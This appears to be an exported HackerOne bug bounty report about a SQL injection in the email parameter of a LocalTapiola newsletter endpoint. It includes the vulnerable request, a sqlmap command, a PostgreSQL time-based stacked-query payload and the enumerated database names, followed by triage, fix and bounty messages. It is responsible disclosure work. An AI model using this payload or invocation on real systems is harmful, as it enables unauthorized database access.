{"id":179751,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzk3NTE=","url":"https://hackerone.com/reports/179751","title":"SQL Injection on /webApp/omatalousuk (viestinta.lahitapiola.fi)","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2016-11-02T19:51:45.499Z","submitted_at":"2016-11-02T19:51:45.499Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"anandakshya","url":"/anandakshya","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8416,"url":"https://hackerone.com/localtapiola","handle":"localtapiola","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"LocalTapiola","twitter_handle":"","website":"http://www.lahitapiola.fi","about":"LocalTapiolaâ€™s products and services cover non-life, life and pension insurance, as well as investment and saving services."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-01-07T13:06:54.452Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2016-12-08T13:06:44.345Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report a SQL Injection vulnerability on **viestinta.lahitapiola.fi**\n\n_*Vulnerable Request:*_\n\n```\nGET /webApp/omatalousuk?email=aaaaa HTTP/1.1\nHost: viestinta.lahitapiola.fi\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://www.lahitapiola.fi/henkilo/sivut/lahitapiolan-uutiskirjeet\nOrigin: http://www.lahitapiola.fi\nDNT: 1\nConnection: close\n```\n\n_*Vulnerable Parameter:*_  *email*\n\nThe vulnerability was discovered by [sqlmap framework](https://github.com/sqlmapproject/sqlmap).\n\nsqlmap output below:\n\n```\nakshya @ localhost in ~/sqlmap $ python sqlmap.py -r viestinta -p email -v3 --dbs\n\n[01:08:22] [INFO] parsing HTTP request from 'viestinta'\n[01:08:22] [DEBUG] resolving hostname 'viestinta.lahitapiola.fi'\n[01:08:22] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: email (GET)\n    Type: stacked queries\n    Title: PostgreSQL \u003e 8.1 stacked queries (comment)\n    Payload: email=aaaaa';SELECT PG_SLEEP(5)--\n    Vector: ;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)--\n---\n[01:08:23] [INFO] the back-end DBMS is PostgreSQL\nweb application technology: Apache\nback-end DBMS: PostgreSQL\navailable databases [4]:\n[*] information_schema\n[*] pg_catalog\n[*] public\n[*] tapiola\n```\nPlease, let me know once this patched is deployed on production.\n\nRegards\nAkshya","bounty_amount":"1560.0","formatted_bounty":"$1,560","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-01-07T13:06:44.393Z","allow_singular_disclosure_after":-150166043.79892188,"singular_disclosure_allowed":true,"vote_count":41,"voters":["bobrov","tk0","bogdantcaciuc","danila","spam404","ysx","encrypt","dilawer01","mpz","madrobot","and 31 more..."],"severity":{"rating":"medium","score":5.9,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"none","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1281861,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 7 days, but usually much faster. Bounty decisions are made 1-2 times per month, so please have patience.","automated_response":false,"created_at":"2016-11-03T08:40:59.758Z","updated_at":"2016-11-03T08:40:59.758Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1281862,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"The reported issue as (at least preliminarily) verified. The domain is out of scope (also: it does not contain any other than publicly available information and is not business critical) , so further actions will have lower priority, including possible fixes. We will forward this report to the 3rd party responsible for managing this domain. I will inform you how things are moving along as I get updates.","automated_response":false,"created_at":"2016-11-03T08:44:02.490Z","updated_at":"2016-11-03T08:44:29.385Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1282114,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Thomas,\n\nAppreciate your quick response. \n\nI shall wait to hear back from you.\n\nRegards\nAkshya","automated_response":false,"created_at":"2016-11-03T11:28:44.657Z","updated_at":"2016-11-03T11:28:44.657Z","actor":{"username":"anandakshya","cleared":false,"url":"/anandakshya","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1300247,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2016-11-15T12:19:38.090Z","updated_at":"2016-11-15T12:19:38.090Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1300248,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello, we have been informed that this is now fixed. Could you verify and let us know if you agree?","automated_response":false,"created_at":"2016-11-15T12:20:17.192Z","updated_at":"2016-11-15T12:20:17.192Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1302990,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hello Thomas,\n\nVerified! The SQL Injection issue vulnerability has been fixed.\n\nWondering if my report qualifies for any bounty?\n\nRegards\nAkshya","automated_response":false,"created_at":"2016-11-16T19:49:20.022Z","updated_at":"2016-11-16T19:49:20.022Z","actor":{"username":"anandakshya","cleared":false,"url":"/anandakshya","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1304716,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2016-11-17T10:54:12.845Z","updated_at":"2016-11-17T10:54:12.845Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1304720,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We will make bountydecisions in our next meeting, in a few weeks. Have patience.","automated_response":false,"created_at":"2016-11-17T10:57:55.764Z","updated_at":"2016-11-17T10:57:55.764Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1305460,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Thomas,\n\nAppreciate your reply!\n\nRegards\nAkshya","automated_response":false,"created_at":"2016-11-17T18:42:17.121Z","updated_at":"2016-11-17T18:42:17.121Z","actor":{"username":"anandakshya","cleared":false,"url":"/anandakshya","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1350493,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We have decided to give you a bounty.","automated_response":false,"created_at":"2016-12-08T13:00:47.439Z","updated_at":"2016-12-08T13:00:47.439Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"560.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"anandakshya","url":"/anandakshya"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1350494,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for your efforts in our bug bounty program.","automated_response":false,"created_at":"2016-12-08T13:02:03.605Z","updated_at":"2016-12-08T13:02:03.605Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"anandakshya","url":"/anandakshya"},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1350499,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-12-08T13:06:44.364Z","updated_at":"2016-12-08T13:06:44.364Z","first_to_agree":true,"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1406185,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-01-07T13:06:54.472Z","updated_at":"2017-01-07T13:06:54.472Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"LocalTapiola"}},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1428797,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2017-01-18T23:18:35.281Z","updated_at":"2017-01-18T23:18:35.281Z","additional_data":{"old_title":"SQL Injection on viestinta.lahitapiola.fi","new_title":"SQL Injection on /webApp/omatalousu (viestinta.lahitapiola.fi)"},"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1429384,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2017-01-19T08:21:04.345Z","updated_at":"2017-01-19T08:21:04.345Z","additional_data":{"old_title":"SQL Injection on /webApp/omatalousu (viestinta.lahitapiola.fi)","new_title":"SQL Injection on /webApp/omatalousuk (viestinta.lahitapiola.fi)"},"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1434412,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We have found that the underlying infrastructure and database contained a limited set of non-public customer related information. For this reason, we have decided to award this report with an additional bonus.","automated_response":false,"created_at":"2017-01-21T09:27:59.908Z","updated_at":"2017-01-21T09:27:59.908Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"0.0","bounty_currency":"usd","bonus_amount":"1000.0","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"anandakshya","url":"/anandakshya"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1434416,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2017-01-21T09:28:58.919Z","updated_at":"2017-01-21T09:28:58.919Z","additional_data":{"old_severity":"High","new_severity":"Medium (5.9)","old_severity_id":5597,"new_severity_id":20812},"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":3062,"category":"team","content":"##Issue\n\nThe reporter found an SQL injection in one of the applications in viestinta.lahitapiola.fi. \n\n##Fix\n\nThe issue was investigated and found to be valid and critical. \n\n##Reasoning\n\nThe reported case was valid and right on target for the scope of the bug bounty program. SQL injections are always critical as they pose a serious threat to the underlying database and the information therein. Even in the case of the data being public information - as was the case here -  there are still many vectors for seriously misusing this kind of a vulnerability. ","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":60017,"username":"localtapiola-thomas","name":"localtapiola-thomas","bio":"LocalTapiola Bug Bounty Coordinator - @tsmalmbe","cleared":false,"website":"http://www.lahitapiola.fi","location":"Espoo, Finland","created_at":"2016-03-09T13:58:17.117Z","url":"https://hackerone.com/localtapiola-thomas","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"legacy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://hackerone.com/rails/active_storage/representations/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcWtrIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ef0702cef87b20f1437c9a717c8b44719b380f58/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9MY21WemFYcGxTU0lOTWpZd2VESTJNRDRHT2daRlZBPT0iLCJleHAiOm51bGwsInB1ciI6InZhcmlhdGlvbiJ9fQ==--7e37b612eb3c91a96f98ad01ca9fbe53cab870dd/hackerone-userlogo.png"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}